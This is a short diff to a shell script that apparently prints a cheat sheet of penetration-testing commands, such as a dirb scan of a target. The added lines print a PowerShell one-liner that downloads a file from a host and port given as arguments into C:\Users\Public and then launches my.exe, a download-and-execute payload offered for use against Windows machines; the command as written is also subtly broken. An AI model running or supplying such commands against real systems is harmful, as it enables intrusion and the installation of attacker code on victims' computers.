@@ -7,6 +7,9 @@ printf "\n\n"
 printf "dirb http://$1"
 printf "\n\n"
 
+printf "$wc = New-Object System.Net.WebClient;$wc.DownloadFile(http://$1:$2, \"C:\Users\Public\");Start-Process -Filepath \"C:\Users\Public\my.exe\""
+printf "\n\n"
+
 printf "apt update && apt install -y virtualbox-guest-x11"
 printf "\n\n"
 
